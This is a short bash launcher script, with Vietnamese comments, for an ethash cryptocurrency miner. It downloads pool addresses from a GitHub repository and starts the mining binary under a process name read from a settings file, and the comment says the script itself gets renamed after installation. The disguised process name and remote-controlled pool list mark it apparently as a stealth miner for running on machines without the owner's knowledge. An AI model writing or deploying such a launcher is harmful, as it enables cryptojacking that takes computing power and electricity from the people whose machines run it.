#!/bin/bash
#Run for Tex-r sau khi cai dat se doi ten thanh runsrc
rm -rf wpo1.txt wpo2.txt
Uuname=$(cat inuser.txt)

cp ../gitpath.txt gitpath.txt

gitpathbin=$(cat gitpath.txt)
wget https://raw.githubusercontent.com/$gitpathbin/main/wpo1.txt
wget https://raw.githubusercontent.com/$gitpathbin/main/wpo2.txt
sleep 1

date=$(cat date.txt)
USEPROCNAME=$(cat SETPROCNAME.txt)
namenday="$Uuname"-"$date"
pool1=$(cat wpo1.txt)
pool2=$(cat wpo2.txt)

./$USEPROCNAME -a ethash -o stratum+http://$pool1 -o stratum+http://$pool2
